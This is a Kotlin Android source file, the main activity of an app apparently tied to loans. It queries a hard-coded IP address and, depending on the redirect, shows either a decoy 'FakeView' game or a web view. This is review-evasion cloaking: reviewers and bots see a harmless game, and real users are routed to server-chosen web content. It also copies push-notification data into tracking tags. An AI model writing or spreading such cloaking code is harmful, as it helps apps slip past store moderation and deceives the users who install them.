package com.organizationzaim.multiapp

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.webkit.WebSettings
import com.onesignal.OSNotification
import com.onesignal.OneSignal
import com.organizationzaim.multiapp.FakeView.Game.GameActivity
import com.organizationzaim.multiapp.web.WebActivity
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONException


class MainActivity : Activity(), OneSignal.NotificationReceivedHandler {

    private lateinit var okHttpClient: OkHttpClient


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);

        OneSignal.startInit(this)
            .setNotificationReceivedHandler(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

        initOkHttpClient()

        val intent = when (isBot()){
            true -> Intent(this, GameActivity::class.java)
            else -> Intent(this, WebActivity::class.java)
        }

        startActivity(intent)
    }

    override fun notificationReceived(notification: OSNotification) {
        val keys = notification.payload.additionalData.keys()
        while (keys.hasNext()) {
            val key = keys.next()
            try {
                OneSignal.sendTag(key, notification.payload.additionalData.get(key).toString())
            } catch (e: JSONException) {
                e.printStackTrace()
            }
        }
    }

    private fun initOkHttpClient() {
        okHttpClient = OkHttpClient.Builder()
            .followSslRedirects(false)
            .followRedirects(false)
            .addNetworkInterceptor {
                it.proceed(
                    it.request().newBuilder()
                        .header("User-Agent", WebSettings.getDefaultUserAgent(this))
                        .build()
                )
            }.build()

    }

    private fun isBot(): Boolean {
        try {
            val response = okHttpClient
                .newCall(Request.Builder().url("http://78.47.187.129/Z4ZvXH31").build())
                .execute()
            val redirectLocation = response.header("Location")

            redirectLocation?.let { return Uri.parse(it).host == "bot" } ?: return true
        } catch (ex: Exception) {
            return true
        }
    }

}
